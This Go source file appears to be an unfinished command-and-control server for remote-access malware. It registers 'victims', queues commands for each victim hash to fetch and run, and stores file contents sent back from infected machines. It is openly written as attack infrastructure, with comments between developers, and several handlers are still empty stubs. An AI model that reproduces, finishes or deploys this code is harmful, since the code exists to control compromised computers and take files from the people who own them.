package main

import (
	//"bufio"
	//"bytes"
	//"encoding/base64"
	"strings"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"

	rbt "github.com/emirpasic/gods/trees/redblacktree"
)

var superCatTree = rbt.NewWithStringComparator() // key: hash, value: []IncomingSuperCatData
var superCatMutex sync.Mutex

// runs in a goroutine
func startServer() {
	http.HandleFunc("/proxy", proxyHandler)

	fmt.Println("Running on localhost:8888")

	err := http.ListenAndServe(":8888", nil)
	if err != nil {
		fmt.Println("The Server failed to run:", err)
	}
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	fmt.Println("Message recieved from: ", r.Host)

	//read the message received to our side (should be none with GET)
	message, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}
	
	//messages come in in the form need to separate them out 
	// "jsonIdentifier{json data}"
	designator, json, err := SeparateJsonDesignator(string(message))
	if(err != nil) {
		println("ERORR encountered could not separate strings correctly")
		return
	}


	switch designator {
	case "victimregister/json":
		resp := RegisterNewVictim(json)
		fmt.Fprintf(w, resp)
	case "requestCommand/json":
		resp := HandleIncomingRequest(json)
		fmt.Fprintf(w, resp)
	case "incomingData/json":
		resp := HandleIncomingData(json)
		fmt.Fprintf(w, resp)
	}

	

}

// needs to be implemented
// FREDY: I need this to return true if it finds that the incoming hash has messages that can be read from its individual queue
func DoesHashHaveMessages(inputHash string) bool {
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	if val, found := clientTree.Get(inputHash); found {
		victim := val.(VictimInfo)
		return len(victim.Commands) > 0
	}
	return false
}

func HandleIncomingCatData(incomingSuperCatString string) {
	//convert the incoming json to the json object of IncomingSuperCatData
	//handle data this should be the contents of a file that was catted out
	//I would maybe suggest creating a datastream coming from the clients and put that on the RB tree=
	//holding all the hashes

	var catData IncomingSuperCatData

	err := json.Unmarshal([]byte(incomingSuperCatString), &catData)
	if err != nil {
		fmt.Println("Error decoding IncomingSuperCatData:", err)
		return
	}

	// Check if victim hash exists in clientTree
	clientTreeMutex.Lock()
	_, found := clientTree.Get(catData.Hash)
	clientTreeMutex.Unlock()

	if !found {
		fmt.Println("Supercat data rejected: hash not registered ->", catData.Hash)
		return
	}

	// Store in superCatTree
	superCatMutex.Lock()
	defer superCatMutex.Unlock()

	val, exists := superCatTree.Get(catData.Hash)
	if exists {
		list := val.([]IncomingSuperCatData)
		list = append(list, catData)
		superCatTree.Put(catData.Hash, list)
	} else {
		superCatTree.Put(catData.Hash, []IncomingSuperCatData{catData})
	}

	fmt.Printf("Stored supercat data for %s: %s\n", catData.Hash, catData.Filename)

}

func HashGetNextCommand(incomingHash string) VictimCommand {
	//for any given incoming hash get if possible the next command to run return this so it can be sent to the client
	//
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	if val, found := clientTree.Get(incomingHash); found {
		victim := val.(VictimInfo)
		if len(victim.Commands) > 0 {
			nextCmd := victim.Commands[0]
			victim.Commands = victim.Commands[1:]
			clientTree.Put(incomingHash, victim)
			return nextCmd
		}
	}
	return VictimCommand{}
}


func RegisterNewVictim(incomingJson string) (toReturn string){
	return ""
}

func HandleIncomingRequest(incomingJson string) (toreturn string){
	return ""
}

func HandleIncomingData(incomingJson string) (toreturn string){
	return ""
}